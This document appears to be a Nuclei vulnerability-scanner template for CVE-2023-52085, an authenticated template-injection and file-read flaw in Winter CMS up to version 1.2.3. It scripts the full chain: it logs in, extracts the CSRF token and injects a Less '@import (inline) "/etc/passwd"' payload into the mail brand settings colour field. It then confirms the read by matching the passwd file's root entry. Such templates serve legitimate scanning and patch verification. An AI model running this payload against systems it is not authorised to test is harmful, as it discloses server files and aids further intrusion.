id: CVE-2023-52085

info:
  name: Winter CMS SSTI (LFI, SSRF) , (Authenticated)
  author: sanineng
  description: |
    Winter CMS <= v1.2.3, CVE-2023-52085 (LFI, SSRF) , (Authenticated)
  severity: medium
  reference:
    - https://github.com/wintercms/winter/security/advisories/GHSA-2x7r-93ww-cxrq
    - https://nvd.nist.gov/vuln/detail/CVE-2023-52085
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N
    cvss-score: 5.1
    cve-id: CVE-2023-52085
    cwe-id: CWE-22

http:
  - raw:
    - |
      GET /backend/backend/auth/signin HTTP/1.1
      Host: {{Hostname}}

    - |
      POST /backend/backend/auth/signin HTTP/1.1
      Host: {{Hostname}}
      Content-Type: application/x-www-form-urlencoded

      _token={{_token}}&postback=1&login={{username}}&password={{password}}

    - |
      POST /backend/system/mailbrandsettings HTTP/1.1
      Host: {{Hostname}}
      Content-Type: application/x-www-form-urlencoded; charset=UTF-8
      X-WINTER-REQUEST-HANDLER: onSave
      X-WINTER-REQUEST-PARTIALS: 
      X-Requested-With: XMLHttpRequest

      _token={{_token}}&MailBrandSetting%5Bbody_bg%5D=%2342445B;@import%20(inline)%20%22/etc/passwd%22&redirect=0

    - |
      GET /backend/system/mailbrandsettings HTTP/1.1
      Host: {{Hostname}}


    cookie-reuse: true
    host-redirects: true
    max-redirects: 3
    
    matchers:
      - type: regex
        regex:
          - "root:[x*]:0:0:"
        part: body
    
    extractors:
    - type: regex
      name: _token
      part: body
      group: 1
      regex:
        - '<input name="_token" type="hidden" value="([0-9a-zA-Z]{40})">'
      internal: true
